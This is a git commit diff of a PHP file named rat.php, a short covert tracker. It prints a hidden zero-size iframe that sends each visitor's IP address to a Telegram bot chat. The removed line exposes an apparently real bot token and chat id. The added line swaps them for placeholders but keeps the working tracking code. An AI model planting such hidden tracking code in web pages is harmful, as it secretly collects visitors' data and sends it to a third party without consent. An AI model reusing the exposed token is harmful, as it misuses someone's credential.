020ea1834a701ab01c7184451c0b8d421a5fd883
Ali Rıza KESKİN <aliriza.keskin@pardustopluluk.org>
2017-10-19 23:26:50 +0300

    Update rat.php

--- rat.php
+++ rat.php
@@ -1,4 +1,4 @@
 <?php 
 $message="ip detected";
-print '<iframe width="0" height="0" src="https://api.telegram.org/bot301147721:AAFizhCHrY0aHpyCCGUE3a2yQSgr_aQHfcI/sendMessage?chat_id=-1001100970990&text='.$_SERVER['REMOTE_ADDR'].' - '.$message.'" frameborder="0" allowfullscreen></iframe>';
+print '<iframe width="0" height="0" src="https://api.telegram.org/bot<token>/sendMessage?chat_id=<chatid>&text='.$_SERVER['REMOTE_ADDR'].' - '.$message.'" frameborder="0" allowfullscreen></iframe>';
 ?>
